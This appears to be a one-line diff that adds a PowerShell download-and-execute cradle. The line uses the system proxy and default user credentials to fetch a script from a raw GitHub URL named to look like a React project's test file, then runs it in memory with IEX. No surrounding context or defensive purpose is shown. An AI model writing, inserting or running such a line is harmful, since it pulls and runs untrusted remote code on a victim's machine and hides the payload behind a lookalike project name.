@@ -1,0 +1,1 @@
+$l=New-Object System.Net.WebClient;$l.proxy=[Net.WebRequest]::GetSystemWebProxy();$l.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX($l.DownloadString('https://raw.githubusercontent.com/ReactDeveloper2017/react/master/src/test/test.js'))
